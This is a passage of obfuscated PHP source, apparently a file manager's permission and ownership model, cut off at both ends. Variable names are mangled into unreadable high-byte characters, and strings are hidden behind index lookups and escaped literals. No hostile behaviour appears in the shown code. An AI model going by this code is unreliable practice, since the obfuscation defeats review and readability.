array_merge($Ú¶‹«—›, array(intval($¥‰î‡ãí)), array_reverse($ó³Îêøğ)); } $Ú¶‹«—› = array_values(array_unique($Ú¶‹«—›)); if (!$Ú¶‹«—›) { return array(); } $„®Øè÷Â = $this->sourceAuthSelect($Ú¶‹«—›); $ç‹Ôª‘æ = array(); foreach ($Ú¶‹«—› as $½æË…’ğ) { if (isset($„®Øè÷Â[$½æË…’ğ])) { $ç‹Ôª‘æ[$½æË…’ğ] = $„®Øè÷Â[$½æË…’ğ]; } } $€›†”²‘ = $this->userIsRoot($Ñ¦ù³¤í); $‰åš€× = AuthModel::authAll(); $¾¾¿…ªÇ = array($ó†çˆ±Š[499] => $‰åš€×, $ó†çˆ±Š[2326] => array($ó†çˆ±Š[504] => 0, $ó†çˆ±Š[2128] => $‰åš€×, $ó†çˆ±Š[505] => LNG($ó†çˆ±Š[2307]), $ó†çˆ±Š[2143] => $ó†çˆ±Š[2308])); $£¹ìÛ”¿ = array(); foreach ($¸°áÒÀ€ as $½æË…’ğ => $ôÀä¯§±) { if ($€›†”²‘ && $GLOBALS[$ó†çˆ±Š[6]][$ó†çˆ±Š[2141]]) { $£¹ìÛ”¿[$½æË…’ğ] = $¾¾¿…ªÇ; continue; } $£¹ìÛ”¿[$½æË…’ğ] = $this->makeSourceAuth($ôÀä¯§±, $ç‹Ôª‘æ, $Ñ¦ù³¤í); } return $£¹ìÛ”¿; } public function authDeepCheck($°§½ğÊû, $¯„€ã…ø = false) { $ºıÓì =& $_SERVER[¿ÈˆÑ¸ä]; $¯„€ã…ø = $¯„€ã…ø ? $¯„€ã…ø : USER_ID; $×“•ƒù = $this->makeAuthDeep($¯„€ã…ø); if (!in_array($°§½ğÊû, $×“•ƒù[$ºıÓì[2327]])) { return !1; } $ˆù‚ÔçÒ = array(); foreach ($×“•ƒù[$ºıÓì[2328]] as $±ªôì¼ç => $©ıûÀÇÂ) { if (!in_array($°§½ğÊû, $©ıûÀÇÂ)) { continue; } $ˆù‚ÔçÒ[] = $±ªôì¼ç; } if (!$ˆù‚ÔçÒ) { return !1; } $’ˆª”ïò = $ˆù‚ÔçÒ ? $ˆù‚ÔçÒ[0] : $°§½ğÊû; return array($ºıÓì[499] => -1, $ºıÓì[552] => array($ºıÓì[504] => $ºıÓì[1313], $ºıÓì[2128] => $ºıÓì[229], $ºıÓì[505] => LNG($ºıÓì[2329]), $ºıÓì[2143] => $ºıÓì[2330]), $ºıÓì[2318] => LNG($ºıÓì[2331]), $ºıÓì[2332] => $this->sourceAuthInfo($’ˆª”ïò)); } protected function makeAuthDeep($’çªø’‹ = false) { $Í™ßáˆœ =& $_SERVER[¿ÈˆÑ¸ä]; static $‰Ÿ£˜Š = array(); $’çªø’‹ = $’çªø’‹ ? $’çªø’‹ : USER_ID; if (isset($‰Ÿ£˜Š[$’çªø’‹])) { return $‰Ÿ£˜Š[$’çªø’‹]; } $Ê€˜¶äÍ = Model($Í™ßáˆœ[2333])->listData(); $ÕØÕÒ¤ = array(); foreach ($Ê€˜¶äÍ as $ã÷ÈŞìâ) { if ($ã÷ÈŞìâ[$Í™ßáˆœ[498]] == 0 && $ã÷ÈŞìâ[$Í™ßáˆœ[2142]] == $Í™ßáˆœ[91]) { $ÕØÕÒ¤[] = $ã÷ÈŞìâ[$Í™ßáˆœ[483]]; } } $—¯òÏóÚ = $this->userGroupParents($’çªø’‹); $ÁŒ­ìƒÒ = array($Í™ßáˆœ[189] => SourceModel::TYPE_USER, $Í™ßáˆœ[585] => $’çªø’‹); if ($—¯òÏóÚ) { $ÁŒ­ìƒÒ = array(array($Í™ßáˆœ[189] => SourceModel::TYPE_USER, $Í™ßáˆœ[585] => $’çªø’‹), array($Í™ßáˆœ[189] => SourceModel::TYPE_GROUP, $Í™ßáˆœ[585] => array($Í™ßáˆœ[503], $—¯òÏóÚ)), $Í™ßáˆœ[1103] => $Í™ßáˆœ[2222]); } $¨ŸªÔò = $this->field($Í™ßáˆœ[2334])->where($ÁŒ­ìƒÒ)->select(); $êšõİ²† = array(); $–¬˜ß­ª = array_to_keyvalue_group($¨ŸªÔò, $Í™ßáˆœ[192]); foreach ($–¬˜ß­ª as $òÛ‘‚Ã” => $…¸üöø—) { $”¨Î®É = $this->authArrayCheck($…¸üöø—, $’çªø’‹); if ($”¨Î®É[$Í™ßáˆœ[499]] > 0) { $êšõİ²†[] = $òÛ‘‚Ã” . $Í™ßáˆœ[12]; } } if ($—¯òÏóÚ) { $şøÜœû¿ = Model($Í™ßáˆœ[601]); foreach ($—¯òÏóÚ as $êªÛäË) { $ÈÖ¡’Çá = $şøÜœû¿->getInfo($êªÛäË); if (!$ÈÖ¡’Çá || !is_array($ÈÖ¡’Çá[$Í™ßáˆœ[90]])) { continue; } $êšõİ²†[] = $ÈÖ¡’Çá[$Í™ßáˆœ[90]][$Í™ßáˆœ[192]]; } } $Òâú¦˜÷ = array(); $Ë“äŞÓ = $—¯òÏóÚ; $Æ‘õÛ³ã = Model($Í™ßáˆœ[1469]); $şøÜœû¿ = Model($Í™ßáˆœ[601]); $ş¼şØŠê = array(); $©€ñ¦Û = array(); $æ³ëËÜ« = array(); $Ïß¯ìúÉ = array(); if ($êšõİ²†) { $ßƒ±¸ë = $Æ‘õÛ³ã->where(array($Í™ßáˆœ[192] => array($Í™ßáˆœ[503], $êšõİ²†)))->select(); foreach ($ßƒ±¸ë as $ìèÔì) { if ($ìèÔì[$Í™ßáˆœ[516]] == $Í™ßáˆœ[91]) { continue; } $­Œ´Ø·¸ = $Æ‘õÛ³ã->parentLevelArray($ìèÔì[$Í™ßáˆœ[600]]); $Òâú¦˜÷ = array_merge($Òâú¦˜÷, $­Œ´Ø·¸); $Ë“äŞÓ[] = $ìèÔì[$Í™ßáˆœ[585]]; $ş¼şØŠê[$ìèÔì[$Í™ßáˆœ[192]]] = $­Œ´Ø·¸; $©€ñ¦Û[$ìèÔì[$Í™ßáˆœ[192]]] = $ìèÔì[$Í™ßáˆœ[585]]; } } $Ë“äŞÓ = array_values(array_unique($Ë“äŞÓ)); $ÌçŸºÅ« = $Ë“äŞÓ; foreach ($ÌçŸºÅ« as $êªÛäË) { $ÈÖ¡’Çá = $şøÜœû¿->getInfo($êªÛäË); $­Œ´Ø·¸ = $Æ‘õÛ³ã->parentLevelArray($ÈÖ¡’Çá[$Í™ßáˆœ[600]]); $Ë“äŞÓ = array_merge($Ë“äŞÓ, $­Œ´Ø·¸); } $Ë“äŞÓ = array_values(array_unique($Ë“äŞÓ)); foreach ($Ë“äŞÓ as $êªÛäË) { $ÈÖ¡’Çá = $şøÜœû¿->getInfo($êªÛäË); $Òâú¦˜÷[] = $ÈÖ¡’Çá[$Í™ßáˆœ[90]][$Í™ßáˆœ[192]]; $æ³ëËÜ«[$êªÛäË] = $ÈÖ¡’Çá[$Í™ßáˆœ[90]][$Í™ßáˆœ[192]]; $Ïß¯ìúÉ[$êªÛäË] = $Æ‘õÛ³ã->parentLevelArray($ÈÖ¡’Çá[$Í™ßáˆœ[600]]); } foreach ($ş¼şØŠê as $õê¸¨ò„ => $ÛÂó¡Ü…) { $¥úœ„“Ä = $©€ñ¦Û[$õê¸¨ò„]; if (!$¥úœ„“Ä || !$æ³ëËÜ«[$¥úœ„“Ä]) { continue; } $ƒ²¬‰Ò = array(); foreach ($Ïß¯ìúÉ[$¥úœ„“Ä] as $êªÛäË) { $ƒ²¬‰Ò[] = $æ³ëËÜ«[$êªÛäË]; } $ş¼şØŠê[$õê¸¨ò„] = array_merge($ƒ²¬‰Ò, $ÛÂó¡Ü…); } $Òâú¦˜÷ = array_values(array_unique($Òâú¦˜÷)); $•®ºôºş = array($Í™ßáˆœ[2327] => $Òâú¦˜÷, $Í™ßáˆœ[2328] => $ş¼şØŠê); $‰Ÿ£˜Š[$’çªø’‹] = $•®ºôºş; return $•®ºôºş; } private function makeSourceAuth($ÓØş’ì‡, $ßÛª½ĞÔ, $®ü¶³ùº = false) { $—´Å˜ÛÓ =& $_SERVER[¿ÈˆÑ¸ä]; $¯ÜÈö¶ = $—´Å˜ÛÓ[91]; $İÀğ“Œù = $ÓØş’ì‡[$—´Å˜ÛÓ[585]]; $Æ–¶Ù¦ì = $ÓØş’ì‡[$—´Å˜ÛÓ[189]] == SourceModel::TYPE_GROUP; $É¹ßúÈÌ = $Æ–¶Ù¦ì ? $this->groupRootAuth($İÀğ“Œù, $®ü¶³ùº) : !1; if ($É¹ßúÈÌ && Model($—´Å˜ÛÓ[587])->authCheckAction($É¹ßúÈÌ[$—´Å˜ÛÓ[498]], $—´Å˜ÛÓ[1501])) { return $this->groupAuthInfo($É¹ßúÈÌ, $İÀğ“Œù); } $ì—œ¬éş = Model($—´Å˜ÛÓ[1469])->parentLevelArray($ÓØş’ì‡[$—´Å˜ÛÓ[600]]); $ì—œ¬éş = array_merge(array($ÓØş’ì‡[$—´Å˜ÛÓ[192]]), array_reverse($ì—œ¬éş)); $É»ïŠ¶Ó = !1; foreach ($ì—œ¬éş as $âÁÀù) { if (!isset($ßÛª½ĞÔ[$âÁÀù])) { continue; } $ÓÈ»¶°ƒ = $this->authMake($ßÛª½ĞÔ[$âÁÀù], $®ü¶³ùº); if ($ÓÈ»¶°ƒ[$—´Å˜ÛÓ[552]]) { $É»ïŠ¶Ó = $ÓÈ»¶°ƒ; break; } } if (!$Æ–¶Ù¦ì) { return $É»ïŠ¶Ó; } if (!$É»ïŠ¶Ó && $É¹ßúÈÌ) { $É»ïŠ¶Ó = $this->groupAuthInfo($É¹ßúÈÌ, $İÀğ“Œù); } if (!$É»ïŠ¶Ó) { $Š÷µü¾ = Model($—´Å˜ÛÓ[601])->getInfo($İÀğ“Œù); $ÌêìÒœã = explode($—´Å˜ÛÓ[50], trim($Š÷µü¾[$—´Å˜ÛÓ[600]], $—´Å˜ÛÓ[50])); $ÌêìÒœã = array_reverse($ÌêìÒœã); foreach ($ÌêìÒœã as $¬ÇÖ¡Ï) { if ($¬ÇÖ¡Ï == $—´Å˜ÛÓ[229] || $¬ÇÖ¡Ï == $¯ÜÈö¶) { continue; } $¢­ÑÌº€ = $this->groupRootAuth($¬ÇÖ¡Ï, $®ü¶³ùº); if (!$¢­ÑÌº€) { continue; } $É»ïŠ¶Ó = $this->groupAuthInfo($¢­ÑÌº€, $¬ÇÖ¡Ï); break; } } if (!$É»ïŠ¶Ó || $É»ïŠ¶Ó[$—´Å˜ÛÓ[499]] <= 0) { $³ÅÎã¦‡ = $this->authDeepCheck($ÓØş’ì‡[$—´Å˜ÛÓ[192]], $®ü¶³ùº); if ($³ÅÎã¦‡) { $É»ïŠ¶Ó = $³ÅÎã¦‡; } } return $É»ïŠ¶Ó; } private function userIsRoot($‡çµ½²Í = false) { $êÔÌÏè =& $_SERVER[¿ÈˆÑ¸ä]; if (!$‡çµ½²Í && KodUser::isRoot()) { return !0; } $Úü×ñÒŸ = Model($êÔÌÏè[613])->getInfo($‡çµ½²Í); $»Ë·‚û = Model($êÔÌÏè[2311])->listData($Úü×ñÒŸ[$êÔÌÏè[2312]]); if ($»Ë·‚û && $»Ë·‚û[$êÔÌÏè[591]][$êÔÌÏè[2315]] == 1) { return !0; } return !1; } private function sourceAuthInfo($·ÏàíŞÛ) { $ê²ŸªÄÎ =& $_SERVER[¿ÈˆÑ¸ä]; $ñ± İà… = Model($ê²ŸªÄÎ[1469]); $ÆšÍ–¾ = $ñ± İà…->sourceInfo($·ÏàíŞÛ); if (!$ÆšÍ–¾) { return !1; } $ñ± İà…->groupPathDisplay($ÆšÍ–¾); $Ï…’šÎ• = array($ÆšÍ–¾); $Ï…’šÎ• = $ñ± İà…->_listAppendPath($Ï…’šÎ•, !1); $ÆšÍ–¾ = $Ï…’šÎ•[0]; $³ÂÀ¾øÒ = $ÆšÍ–¾[$ê²ŸªÄÎ[598]]; if (isset($ÆšÍ–¾[$ê²ŸªÄÎ[606]])) { $ø³—®×ö = explode($ê²ŸªÄÎ[8], trim($ÆšÍ–¾[$ê²ŸªÄÎ[598]], $ê²ŸªÄÎ[8])); array_shift($ø³—®×ö); $³ÂÀ¾øÒ = $ÆšÍ–¾[$ê²ŸªÄÎ[604]] . $ê²ŸªÄÎ[2335] . implode($ê²ŸªÄÎ[8], $ø³—®×ö); } return array($ê²ŸªÄÎ[32] => $ÆšÍ–¾[$ê²ŸªÄÎ[32]], $ê²ŸªÄÎ[192] => $ÆšÍ–¾[$ê²ŸªÄÎ[192]], $ê²ŸªÄÎ[87] => KodIO::make($ÆšÍ–¾[$ê²ŸªÄÎ[192]]), $ê²ŸªÄÎ[598] => $³ÂÀ¾øÒ); } private function groupAuthInfo($ ‘¤‹Àâ, $ÄÛÈŞ‡¨) { $¿Ş™Õ¨› =& $_SERVER[¿ÈˆÑ¸ä]; $¦üœ‘ = Model($¿Ş™Õ¨›[601])->getInfo($ÄÛÈŞ‡¨); return array($¿Ş™Õ¨›[2336] => intval($ ‘¤‹Àâ[$¿Ş™Õ¨›[498]]), $¿Ş™Õ¨›[2326] => $ ‘¤‹Àâ, $¿Ş™Õ¨›[2337] => LNG($¿Ş™Õ¨›[2338]), $¿Ş™Õ¨›[2332] => array($¿Ş™Õ¨›[505] => $¦üœ‘[$¿Ş™Õ¨›[32]], $¿Ş™Õ¨›[87] => KodIO::make($¦üœ‘[$¿Ş™Õ¨›[90]][$¿Ş™Õ¨›[192]]), $¿Ş™Õ¨›[2339] => $¦üœ‘[$¿Ş™Õ¨›[605]])); } protected function groupRootAuth($¾¾ÚÎ—û, $´¤İìä = false) { $şÃ§Ù“Û =& $_SERVER[¿ÈˆÑ¸ä]; $´¤İìä = $´¤İìä ? $´¤İìä : USER_ID; $í—ŸäëŠ = $´¤İìä . $şÃ§Ù“Û[2340] . $¾¾ÚÎ—û; static $Ù£«£· = array(); if (isset($Ù£«£·[$í—ŸäëŠ])) { return $Ù£«£·[$í—ŸäëŠ]; } $™İş¹û = Model($şÃ§Ù“Û[601])->getInfo($¾¾ÚÎ—û); $¶şÁĞéÌ = $this->userGroupList($´¤İìä); $¡Û€³í˜ = isset($¶şÁĞéÌ[$¾¾ÚÎ—û]) ? $¶şÁĞéÌ[$¾¾ÚÎ—û][$şÃ§Ù“Û[498]] : !1; if ($¡Û€³í˜ && Model($şÃ§Ù“Û[587])->authCheckAction($¡Û€³í˜[$şÃ§Ù“Û[498]], $şÃ§Ù“Û[1501])) { $Ù£«£·[$í—ŸäëŠ] = $¡Û€³í˜; return $¡Û€³í˜; } $¤çèìÆØ = $this->sourceAuthSelect($™İş¹û[$şÃ§Ù“Û[90]][$şÃ§Ù“Û[192]]); $öšéËé = $¤çèìÆØ ? $this->authMake($¤çèìÆØ, $´¤İìä) : !1; $ÇƒœÄ›‘ = $öšéËé ? $öšéËé[$şÃ§Ù“Û[552]] : !1; $Ù£«£·[$í—ŸäëŠ] = $ÇƒœÄ›‘ ? $ÇƒœÄ›‘ : $¡Û€³í˜; return $Ù£«£·[$í—ŸäëŠ]; } public function authOwnerApply($×¹Ç…•Ò) { $æÒ·´Ê =& $_SERVER[¿ÈˆÑ¸ä]; if (empty($×¹Ç…•Ò[$æÒ·´Ê[498]]) || isset($×¹Ç…•Ò[$æÒ·´Ê[1520]]) && $×¹Ç…•Ò[$æÒ·´Ê[1520]]) { return $×¹Ç…•Ò; } if (AuthModel::authCheckRoot($×¹Ç…•Ò[$æÒ·´Ê[498]][$æÒ·´Ê[499]])) { return $×¹Ç…•Ò; } $á™Äì‹® = Model($æÒ·´Ê[1469])->parentLevelArray($×¹Ç…•Ò[$æÒ·´Ê[600]]); $á™Äì‹® = array_merge(array($×¹Ç…•Ò[$æÒ·´Ê[192]]), array_reverse($á™Äì‹®)); $˜í¯²ã = $this->sourceAuthSelect($á™Äì‹®); $ÔùœÏ½ = array(); $ß¨ÃĞß© = array(); foreach ($˜í¯²ã as $¾ÈŸ¡Ò => $¢¨²ôìº) { $øÙÔ©éô = $this->authFolderOwnerUser($¢¨²ôìº); $ÔùœÏ½[$¾ÈŸ¡Ò] = $øÙÔ©éô; $ß¨ÃĞß© = array_merge($ß¨ÃĞß©, $øÙÔ©éô[$æÒ·´Ê[681]]); if ($øÙÔ©éô[$æÒ·´Ê[2341]]) { break; } } if (count($ß¨ÃĞß©) == 0) { $ß¨ÃĞß© = $this->authFolderOwnerGroup($×¹Ç…•Ò[$æÒ·´Ê[585]]); } $ß¨ÃĞß© = array_unique($ß¨ÃĞß©); if (AuthModel::authCheckRoot($×¹Ç…•Ò[$æÒ·´Ê[498]][$æÒ·´Ê[499]])) { $ß¨ÃĞß©[] = USER_ID; } $×¹Ç…•Ò[$æÒ·´Ê[498]][$æÒ·´Ê[2342]] = Model($æÒ·´Ê[593])->userListInfo($ß¨ÃĞß©); return $×¹Ç…•Ò; } private function authFolderOwnerGroup($¹ã§ÖÈ) { $¶ÓÄŠ³‹ =& $_SERVER[¿ÈˆÑ¸ä]; $·ªÆ¾ “ = Model($¶ÓÄŠ³‹[2214])->where(array($¶ÓÄŠ³‹[1431] => $¹ã§ÖÈ))->select(); $ÓÓãö£İ = array(); if (!$·ªÆ¾ “) { return $ÓÓãö£İ; } foreach ($·ªÆ¾ “ as $µå¼ëËí) { $“ô…¤Èá = $this->authInfo($µå¼ëËí); if (AuthModel::authCheckRoot($“ô…¤Èá[$¶ÓÄŠ³‹[498]])) { $ÓÓãö£İ[] = $µå¼ëËí[$¶ÓÄŠ³‹[1529]]; } } return $ÓÓãö£İ; } private function authFolderOwnerUser($¦ ˆäœ­) { $Ä…ÔÍÚ¦ =& $_SERVER[¿ÈˆÑ¸ä]; $ô‚»¯Ã = array(); $£õÁªÙ = !1; foreach ($¦ ˆäœ­ as $‚—£ º¿) { $Ò «ä†± = $this->authInfo($‚—£ º¿); if ($‚—£ º¿[$Ä…ÔÍÚ¦[585]] == $Ä…ÔÍÚ¦[229]) { $£õÁªÙ = !0; } if ($‚—£ º¿[$Ä…ÔÍÚ¦[189]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ò «ä†±[$Ä…ÔÍÚ¦[498]])) { $ô‚»¯Ã[] = $‚—£ º¿[$Ä…ÔÍÚ¦[585]]; } } } return array($Ä…ÔÍÚ¦[681] => $ô‚»¯Ã, $Ä…ÔÍÚ¦[2341] => $£õÁªÙ); } public function authMake($·êÕ¿Ã, $¾ôÛÅÏÌ = false) { $íàÒ¿È– =& $_SERVER[¿ÈˆÑ¸ä]; $‚âóÄ†Ä = $this->authArrayCheck($·êÕ¿Ã, $¾ôÛÅÏÌ); if ($‚âóÄ†Ä[$íàÒ¿È–[2322]]) { $‚âóÄ†Ä[$íàÒ¿È–[2322]] = $this->sourceAuthInfo($‚âóÄ†Ä[$íàÒ¿È–[2322]]); } return $‚âóÄ†Ä; } public function authArrayCheck($éİÊØËÅ, $ÛŞ×äœ = false) { $¢ùë¥ƒ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$éİÊØËÅ) { return array($¢ùë¥ƒ[499] => 0, $¢ùë¥ƒ[552] => !1, $¢ùë¥ƒ[2337] => $¢ùë¥ƒ[12]); } $ÛŞ×äœ = $ÛŞ×äœ ? $ÛŞ×äœ : USER_ID; $Ÿøü¸¨Ÿ = 0; $×ûò¾ƒÏ = 0; $·éõŞ‡ = 0; $ùÊò¨ÇÃ = 0; $…éûÁÇ = 0; $ØÑ†Şª = 0; $­¦æç‘® = 0; $ÅÖÒ‰ò› = 0; $êšöıõ³ = 1000; $äû•ğ÷Ø = 0; $Ëî­½Û = 0; $öÏ¬’ÙÆ = 0; $°Ì‘°µ = 0; $‚ÑÇÕ·Ë = 0; foreach ($éİÊØËÅ as $Îàöé•ú) { $Ñİ¥Œ = $this->authInfo($Îàöé•ú); if (!$Ñİ¥Œ) { continue; } $Ö¯‰£ŠÃ = $Îàöé•ú[$¢ùë¥ƒ[585]]; $í×¬ìÅÚ = $Îàöé•ú[$¢ùë¥ƒ[192]]; $‹¾àõô = intval($Ñİ¥Œ[$¢ùë¥ƒ[498]]); if ($Îàöé•ú[$¢ùë¥ƒ[189]] == SourceModel::TYPE_USER && $Ö¯‰£ŠÃ == $ÛŞ×äœ) { $Ÿøü¸¨Ÿ = !0; $·éõŞ‡ = $Ñİ¥Œ; $×ûò¾ƒÏ = $‹¾àõô; $ùÊò¨ÇÃ = $í×¬ìÅÚ; } else { if ($Îàöé•ú[$¢ùë¥ƒ[189]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ö¯‰£ŠÃ, $ÛŞ×äœ)) { $…éûÁÇ = !0; $Í ¸’úÖ = $this->groupStepToUserGroup($Ö¯‰£ŠÃ, $ÛŞ×äœ); if ($Í ¸’úÖ < $êšöıõ³) { $êšöıõ³ = $Í ¸’úÖ; $ØÑ†Şª = $‹¾àõô; $­¦æç‘® = $Ñİ¥Œ; $äû•ğ÷Ø = $Ö¯‰£ŠÃ; $ÅÖÒ‰ò› = $í×¬ìÅÚ; } if ($Í ¸’úÖ == $êšöıõ³ && $‹¾àõô >= $ØÑ†Şª) { $ØÑ†Şª = $‹¾àõô; $­¦æç‘® = $Ñİ¥Œ; $äû•ğ÷Ø = $Ö¯‰£ŠÃ; $ÅÖÒ‰ò› = $í×¬ìÅÚ; } } else { if (!$Ö¯‰£ŠÃ || $Ö¯‰£ŠÃ == $¢ùë¥ƒ[229]) { $Ëî­½Û = !0; $°Ì‘°µ = $Ñİ¥Œ; $öÏ¬’ÙÆ = $‹¾àõô; $‚ÑÇÕ·Ë = $í×¬ìÅÚ; } } } } if ($Ÿøü¸¨Ÿ) { $ÓÒ¨¾öÌ = $×ûò¾ƒÏ; $Ñİ¥Œ = $·éõŞ‡; $¬’œ’ú° = $ùÊò¨ÇÃ; $»¶Æ ØŒ = LNG($¢ùë¥ƒ[2343]); } else { if ($…éûÁÇ) { $ÓÒ¨¾öÌ = $ØÑ†Şª; $Ñİ¥Œ = $­¦æç‘®; $¬’œ’ú° = $ÅÖÒ‰ò›; $«¿£âñ‹ = Model($¢ùë¥ƒ[601])->getInfo($äû•ğ÷Ø); $»¶Æ ØŒ = $¢ùë¥ƒ[174] . $«¿£âñ‹[$¢ùë¥ƒ[605]] . $¢ùë¥ƒ[2344] . LNG($¢ùë¥ƒ[2345]); } else { if ($Ëî­½Û) { $ÓÒ¨¾öÌ = $öÏ¬’ÙÆ; $Ñİ¥Œ = $°Ì‘°µ; $¬’œ’ú° = $‚ÑÇÕ·Ë; $»¶Æ ØŒ = LNG($¢ùë¥ƒ[2324]); } else { $ÓÒ¨¾öÌ = 0; $Ñİ¥Œ = !1; $»¶Æ ØŒ = $¢ùë¥ƒ[12]; $¬’œ’ú° = $¢ùë¥ƒ[12]; } } } $°’ê›Â§ = array($¢ùë¥ƒ[2336] => intval($ÓÒ¨¾öÌ), $¢ùë¥ƒ[2326] => $Ñİ¥Œ, $¢ùë¥ƒ[2337] => $»¶Æ ØŒ, $¢ùë¥ƒ[2332] => $¬’œ’ú°); return $°’ê›Â§; } private function groupContainUser($ÕôüéÉ, $éÇİ‡ø = false) { return in_array($ÕôüéÉ, $this->userGroupParents($éÇİ‡ø)); } private function groupStepToUserGroup($µÛ°ƒ½¿, $Á¼Ú·ÜŒ = false) { $¡²‡§Ã¯ =& $_SERVER[¿ÈˆÑ¸ä]; $¸‚Ü¨ØÇ = $this->userGroupList($Á¼Ú·ÜŒ); $›Üµöµè = 1000; $ğıõá = $GLOBALS[$¡²‡§Ã¯[6]][$¡²‡§Ã¯[92]][$¡²‡§Ã¯[2227]] == 1; $›Œ¶À•» = $ğıõá ? 3 : 2; foreach ($¸‚Ü¨ØÇ as $¦úÓßÉÈ) { if ($¦úÓßÉÈ[$¡²‡§Ã¯[1431]] == $µÛ°ƒ½¿) { return 0; } $ª®º»ùÊ = explode($¡²‡§Ã¯[50], trim($¦úÓßÉÈ[$¡²‡§Ã¯[600]], $¡²‡§Ã¯[50])); if ($ª®º»ùÊ[0] == $¡²‡§Ã¯[229] && count($ª®º»ùÊ) > $›Œ¶À•») { $Õ²ŞË½ˆ = array_reverse(array_slice($ª®º»ùÊ, $›Œ¶À•»)); $‡ÖÌã§ = array_search($µÛ°ƒ½¿, $Õ²ŞË½ˆ); if ($‡ÖÌã§ !== !1 && $‡ÖÌã§ + 1 <= $›Üµöµè) { $›Üµöµè = $‡ÖÌã§ + 1; } } } return $›Üµöµè; } private function userGroupList($åŠ»ô‘‰ = false, $°İí±‡¤ = false) { $´À¿ıà‡ =& $_SERVER[¿ÈˆÑ¸ä]; static $ÒÇ‹Öú = array(); if (isset($ÒÇ‹Öú[$åŠ»ô‘‰])) { return $ÒÇ‹Öú[$åŠ»ô‘‰]; } if (!$°İí±‡¤) { $°İí±‡¤ = Model($´À¿ıà‡[613])->getInfo($åŠ»ô‘‰); } $ÒÇ‹Öú[$åŠ»ô‘‰] = array_to_keyvalue($°İí±‡¤[$´À¿ıà‡[1430]], $´À¿ıà‡[1431]); return $ÒÇ‹Öú[$åŠ»ô‘‰]; } public function userGroupParents($øÇ¦ùŠ—) { $²¡éó¼Î =& $_SERVER[¿ÈˆÑ¸ä]; static $×½æƒ—£ = array(); $øÇ¦ùŠ— = $øÇ¦ùŠ— ? $øÇ¦ùŠ— : USER_ID; if (isset($×½æƒ—£[$øÇ¦ùŠ—])) { return $×½æƒ—£[$øÇ¦ùŠ—]; } $´ßóİÜ’ = $this->userGroupList($øÇ¦ùŠ—); $²Ä÷Ø©ı = array(); $Öô½±Şé = $GLOBALS[$²¡éó¼Î[6]][$²¡éó¼Î[92]][$²¡éó¼Î[2227]] == 1; $¢®Š„á÷ = $Öô½±Şé ? 3 : 2; foreach ($´ßóİÜ’ as $ŸñÀœÆ) { $äÇ¡âÒá = array($ŸñÀœÆ[$²¡éó¼Î[1431]]); $ÍÀƒ ì¬ = explode($²¡éó¼Î[50], trim($ŸñÀœÆ[$²¡éó¼Î[600]], $²¡éó¼Î[50])); if ($ÍÀƒ ì¬[0] == $²¡éó¼Î[229] && count($ÍÀƒ ì¬) > $¢®Š„á÷) { $”¡±Å²é = array_slice($ÍÀƒ ì¬, $¢®Š„á÷); $äÇ¡âÒá = array_merge($äÇ¡âÒá, array_reverse($”¡±Å²é)); } $²Ä÷Ø©ı = array_merge($²Ä÷Ø©ı, $äÇ¡âÒá); } $×½æƒ—£[$øÇ¦ùŠ—] = array_unique($²Ä÷Ø©ı); return $×½æƒ—£[$øÇ¦ùŠ—]; } public function authTargetInfoMake($§¸ŠĞ¢) { $âº‡»¢å =& $_SERVER[¿ÈˆÑ¸ä]; $õşÏöÜˆ = array(); $ÂËû†ô” = array(); foreach ($§¸ŠĞ¢ as $Ççî×å) { if ($Ççî×å[$âº‡»¢å[189]] == SourceModel::TYPE_USER) { $õşÏöÜˆ[] = intval($Ççî×å[$âº‡»¢å[585]]); } else { if ($Ççî×å[$âº‡»¢å[189]] == SourceModel::TYPE_GROUP) { $ÂËû†ô”[] = intval($Ççî×å[$âº‡»¢å[585]]); } } } if ($õşÏöÜˆ) { $õşÏöÜˆ = Model($âº‡»¢å[593])->userListInfo($õşÏöÜˆ); } if ($ÂËû†ô”) { $òÉëô½ = array($âº‡»¢å[2207] => array($âº‡»¢å[503], $ÂËû†ô”)); $ÂËû†ô” = Model($âº‡»¢å[601])->field($âº‡»¢å[2346])->where($òÉëô½)->select(); $ÂËû†ô” = array_to_keyvalue($ÂËû†ô”, $âº‡»¢å[1431]); } return array($âº‡»¢å[2347] => $õşÏöÜˆ, $âº‡»¢å[2348] => $ÂËû†ô”); } public function authInfo($ò×–ŸÔ) { $¶Şú›ÃÂ =& $_SERVER[¿ÈˆÑ¸ä]; if ($ò×–ŸÔ[$¶Şú›ÃÂ[1576]]) { $çü°ÍÈ¿ = Model($¶Şú›ÃÂ[587])->listData($ò×–ŸÔ[$¶Şú›ÃÂ[1576]]); if (!$çü°ÍÈ¿) { return !1; $ç‡Ü¢Ç = Model($¶Şú›ÃÂ[587])->listData(); $ëªéà²Ñ = array_filter_by_field($ç‡Ü¢Ç, $¶Şú›ÃÂ[498], $¶Şú›ÃÂ[229]); return $ëªéà²Ñ; } $¬Ç«‡ü‡ = array_field_key($çü°ÍÈ¿, array($¶Şú›ÃÂ[483], $¶Şú›ÃÂ[32], $¶Şú›ÃÂ[498], $¶Şú›ÃÂ[2143], $¶Şú›ÃÂ[2144])); $¬Ç«‡ü‡[$¶Şú›ÃÂ[2349]] = $ò×–ŸÔ; return $¬Ç«‡ü‡; } else { return array($¶Şú›ÃÂ[504] => 0, $¶Şú›ÃÂ[2128] => $ò×–ŸÔ[$¶Şú›ÃÂ[2284]], $¶Şú›ÃÂ[505] => $¶Şú›ÃÂ[12], $¶Şú›ÃÂ[2143] => $¶Şú›ÃÂ[2350]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\143\x65\x5f\145\166\145\x6e\164"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\124\x69\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\145\x72\x74", "\146\165\156\x63\x74\151\x6f\x6e"), array("\x64\x65\x73\x63", '', "\151\x6e\163\145\162\164\x2c\165\x70\144\x61\164\145\54\x73\x65\154\145\143\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($µ¦ë§Ò’, $Úùª¥€ª, $ĞÓÙ±ìÜ = '') { $Æõ©ëù´ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->eventSave) { return; } $§Ìã÷ = Model($Æõ©ëù´[1469])->sourceInfo($µ¦ë§Ò’); if (!$§Ìã÷) { return !1; } if ($this->isDisableEvent($§Ìã÷, $Úùª¥€ª)) { return; } if 